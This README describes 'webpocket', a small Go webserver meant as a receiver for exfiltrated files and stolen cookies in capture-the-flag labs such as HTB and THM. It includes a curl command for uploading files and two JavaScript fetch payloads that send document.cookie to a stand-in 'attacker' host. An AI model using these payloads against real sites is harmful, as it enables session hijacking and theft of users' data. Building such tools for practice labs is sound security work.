# webpocket

Your online five finger discount!

A simple webserver you can send files or cookies to. I wrote it specifically for machines on HTB, THM etc.

## Usage:

### CLI arguments

```plaintext=
-h           help
-a <address> address to listen on
-p <port>    specify the port, which the server should run on. Default: 6969
-s <size>    max file size. Default: ~33MB
-k           killswitch, server shuts down after receiving a file
-q           suppress output

-c           activate cookiestealer
-cl          Output file for cookielog. -c needs to be provided. Default: cookielog.txt

-b           activate request bin
-bl          Output file for request bin. -b needs to be provided. Default: requestlog.txt

-tls         activate tls for the server
-cert        path to cert (.pem)
-key         path to cert key (.pem)

-auth        Activate HTTP Basic Auth for file upload. Needs -authuser and -authpass
-authuser    Username for HTTP Basic Auth
-authpass    Password for HTTP Basic Auth
```

### Paths

| Path | Function |
| ---- | -------- | 
| /f   | File upload |
| /c   | Cookie stealer |
| /b   | Request bin |

### Send data

**POST**

```bash=
curl -X POST --form "data=@/path/to/file" http://<server-ip>:6969/f
```

**Cookies via POST**

```js=
fetch('http://attacker/c', {method: "POST", mode: "no-cors", body: document.cookie})
```

**Cookies via GET**

```js=
fetch('http://attacker/c?'+document.cookie.trim().replace("; ", "&"), {method: "GET", mode: "no-cors"})
```


## Building

```bash=
git clone https://github.com/hobirst/webpocket
cd webpocket
go build .
mv webpocket <somewhere/in/$PATH>
```

## Contributions

Yes please
